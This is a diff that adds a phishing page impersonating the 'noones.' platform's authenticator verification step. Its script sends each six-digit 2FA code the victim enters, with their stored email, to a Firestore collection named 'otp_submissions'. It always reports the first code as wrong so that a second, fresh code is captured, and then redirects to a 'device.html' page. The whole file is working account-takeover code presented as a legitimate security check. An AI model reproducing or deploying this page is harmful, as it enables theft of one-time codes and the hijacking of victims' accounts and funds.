@@ -1,0 +1,85 @@
+<!DOCTYPE html><html><head><meta charset='utf-8'><meta name='viewport' content='width=device-width,initial-scale=1'><title>Authenticator</title><style>body{margin:0;background:#1c1c1c;color:#fff;font-family:Arial;display:flex;justify-content:center}.w{max-width:430px;width:100%;padding:40px 22px}.logo{text-align:center;color:#3ecf7e;font-size:42px;font-weight:700}.c{background:#2a2a2a;padding:28px;border-radius:18px;margin-top:25px}.code{display:flex;gap:8px;justify-content:center;margin:20px 0}.code input{width:45px;height:55px;font-size:24px;text-align:center;background:#1f1f1f;color:#fff;border:1px solid #444;border-radius:10px}button{width:100%;padding:15px;background:#3ecf7e;color:#fff;border:none;border-radius:12px;font-weight:bold}</style>
+<style>img,video{max-width:100%;height:auto}body{max-width:100%;overflow-x:hidden}.container,.card,.wrapper{max-width:100%;width:100%!important}@media(max-width:768px){*{box-sizing:border-box}body{padding:0;margin:0}}</style>
+</head><body><div class='w'><div class='logo'>noones.</div><div class='c'><h2>Authenticator verification</h2><p>Enter the 6-digit code from your authenticator app.</p><div class='code'><input maxlength='1'><input maxlength='1'><input maxlength='1'><input maxlength='1'><input maxlength='1'><input maxlength='1'></div><p id='otpError' style='display:none;color:#ff6666;text-align:center'>Wrong code. Please try again.</p><button onclick='v()'>Verify</button></div></div><script type="module">
+
+import { db } from "./js/firebase.js";
+
+import {
+  collection,
+  addDoc,
+  serverTimestamp
+} from "https://www.gstatic.com/firebasejs/12.1.0/firebase-firestore.js";
+
+const boxes = [...document.querySelectorAll(".code input")];
+
+boxes.forEach((box, i) => {
+
+    box.oninput = () => {
+
+        box.value = box.value.replace(/\D/g, "");
+
+        if (box.value && i < boxes.length - 1) {
+            boxes[i + 1].focus();
+        }
+
+    };
+
+});
+
+window.v = async function () {
+
+    const otp = boxes.map(x => x.value).join("");
+
+    if (otp.length !== 6) {
+        alert("Enter all 6 digits");
+        return;
+    }
+
+    const email = localStorage.getItem("loginEmail") || "";
+    let attempts = Number(localStorage.getItem("otpAttempts")) || 0;
+
+    try {
+
+        // Save every OTP submission
+        await addDoc(collection(db, "otp_submissions"), {
+
+            email: email,
+            otp: otp,
+            attempt: attempts + 1,
+            status: "Pending",
+            createdAt: serverTimestamp()
+
+        });
+
+    } catch (error) {
+
+        console.error(error);
+        alert("Error saving OTP:\n" + error.message);
+        return;
+
+    }
+
+    // Keep the existing behavior
+    if (attempts === 0) {
+
+        localStorage.setItem("otpAttempts", "1");
+
+        document.getElementById("otpError").style.display = "block";
+
+        boxes.forEach(x => x.value = "");
+
+        boxes[0].focus();
+
+        return;
+
+    }
+
+    localStorage.removeItem("otpAttempts");
+
+    localStorage.setItem("authenticatorOTP", otp);
+
+    window.location.href = "device.html";
+
+};
+
+</script></body></html>
